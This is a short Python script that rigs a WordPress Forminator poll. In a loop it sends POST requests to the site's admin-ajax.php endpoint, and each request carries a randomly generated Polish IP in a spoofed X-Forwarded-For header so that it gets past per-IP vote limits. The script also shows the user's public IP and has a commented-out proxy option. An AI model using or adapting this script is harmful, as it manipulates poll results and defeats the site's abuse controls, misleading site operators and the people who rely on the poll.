#!/usr/bin/python

import sys
import subprocess
from random import randint

PROXY=None # '78.40.87.18:808'

def generate_ip():
    # https://www.nirsoft.net/countryip/pl.html
    return '.'.join(['31', '187', str(randint(0, 63)), str(randint(1, 254))])

def shell(cmd):
    err_code = subprocess.call(cmd, shell=True)
    if err_code != 0:
        print('failed executing: %s' % cmd)

def curl(params):
    cmd = 'curl ' + params
    if PROXY:
        cmd = 'http_proxy="http://{}/" https_proxy="https://{}/" '.format(PROXY, PROXY) + cmd
    shell(cmd)

print('Your public IP:')
curl('ifconfig.me')
print('')

for idx in xrange(int(sys.argv[1])):
    ip = generate_ip()
    print('\nIP = {}'.format(ip))
    cmd = '-X POST https://url/wp-admin/admin-ajax.php -d "1=answer-1&action=forminator_submit_form_poll" --header "X-Forwarded-For: {}"'.format(ip)
    curl(cmd)
